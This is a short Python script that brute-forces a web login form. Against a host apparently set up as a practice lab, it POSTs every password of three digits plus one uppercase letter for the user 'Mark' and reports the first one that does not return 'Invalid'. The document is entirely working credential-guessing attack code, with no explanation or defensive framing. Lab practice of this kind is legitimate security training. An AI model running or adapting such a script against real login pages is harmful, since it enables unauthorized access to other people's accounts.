import requests
import string

url = "http://10.10.10.65/labs/lab1/index.php"

username = "Mark"


def brute_force():
    for number in range(1000):
        for alphabet in string.ascii_uppercase:
            password = f"{number:03d}{alphabet}"
            data = {"username": username, "password": password}
            response = requests.post(url, data=data)

            if "Invalid" not in response.text:
                print(f"[+]Found credentials: {username}:{password}")
                return
            else:
                print(f"[-]Attempted:{password}")


brute_force()
